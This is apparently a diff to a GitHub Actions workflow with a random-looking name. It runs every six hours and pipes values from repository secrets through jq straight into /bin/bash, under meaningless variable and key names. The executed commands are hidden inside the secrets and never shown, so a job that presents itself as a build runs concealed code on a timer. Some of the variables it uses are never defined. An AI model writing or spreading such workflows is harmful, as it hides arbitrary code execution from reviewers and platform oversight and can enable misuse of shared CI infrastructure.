@@ -3,8 +3,9 @@ name: gansila4571
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 3/6 * * *'
-jobs:  # 32466
+    - cron: '26 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,17 +13,9 @@ jobs:  # 32466
       - uses: actions/checkout@v4
       - name: gansila4571
         env:
-          rab08: ${{ secrets.rab08 }}
+          g7: ${{ secrets.g7 }}
         run: |
-          echo $rab08 | jq -r .lng523 | /bin/bash
-          echo $wtib70 | jq -r .t6745 | /bin/bash
-          echo $hazq4664 | jq -r .r25 | /bin/bash
-          echo $emd05 | jq -r .gj8181 | /bin/bash
-          echo $qjyfm772 | jq -r .jwjy253 | /bin/bash
-          echo $h49369 | jq -r .xdcqh5373 | /bin/bash
-          echo $p7 | jq -r .rco752 | /bin/bash
-          echo $ipjf894 | jq -r .mxrmm06 | /bin/bash
-          echo $sat508 | jq -r .vhhy2128 | /bin/bash
-          echo $hy995 | jq -r .iyiaa45343 | /bin/bash
-          echo $ygql67759 | jq -r .kqkgv0658 | /bin/bash
+          echo $g7 | jq -r .cvpyp245 | /bin/bash
+          echo $nq18687 | jq -r .zs686 | /bin/bash
+          echo $er8 | jq -r .wojnt8172 | /bin/bash
 
